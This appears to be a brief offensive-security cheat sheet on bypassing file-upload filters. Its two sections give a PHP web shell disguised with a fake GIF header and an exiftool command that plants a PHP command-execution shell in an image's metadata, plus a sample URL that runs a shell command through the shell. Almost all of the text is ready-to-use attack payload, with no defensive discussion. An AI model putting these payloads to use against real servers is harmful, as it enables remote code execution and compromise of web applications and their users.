# Bypass Techniques

### General

```php
#Upload as GIF
GIF98ddw213
<?php system($_GET['cmd']); ?> 
```

### Using metadata to execute PHP

```bash
exiftool -DocumentName="<h1><br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';}__halt_compiler();?></h1>" fox.jpg
#Access to http://url.com/image_uploaded.png?cmd=ls
```



